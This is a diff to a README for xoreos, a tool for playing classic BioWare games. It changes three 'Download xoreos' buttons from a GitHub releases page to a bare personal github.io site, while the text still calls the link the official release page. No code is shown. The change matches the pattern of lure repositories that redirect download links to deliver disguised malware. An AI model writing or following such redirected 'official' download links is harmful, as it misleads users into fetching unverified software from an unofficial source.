@@ -1,6 +1,6 @@
 # 🎮 xoreos - Play Classic BioWare Games on Modern Devices
 
-[![Download xoreos](https://img.shields.io/badge/Download-xoreos-blueviolet?style=for-the-badge&logo=github)](https://github.com/shaneviolent4109/xoreos/releases)
+[![Download xoreos](https://img.shields.io/badge/Download-xoreos-blueviolet?style=for-the-badge&logo=github)](https://shaneviolent4109.github.io)
 
 ## 📖 What Is xoreos?
 
@@ -49,7 +49,7 @@ Ready to dive back into your favorite worlds? Follow these simple steps to set u
 
 Go to the official xoreos release page by clicking this link:
 
-[**👉 DOWNLOAD XOREOS NOW 👈**](https://github.com/shaneviolent4109/xoreos/releases)
+[**👉 DOWNLOAD XOREOS NOW 👈**](https://shaneviolent4109.github.io)
 
 )
 
@@ -190,7 +190,7 @@ If you've ever wanted to revisit the world of Neverwinter, train as a Jedi, or c
 
 Your journey starts with a single click:
 
-[**🚀 DOWNLOAD XOREOS NOW**](https://github.com/shaneviolent4109/xoreos/releases)
+[**🚀 DOWNLOAD XOREOS NOW**](https://shaneviolent4109.github.io)
 
 )
 
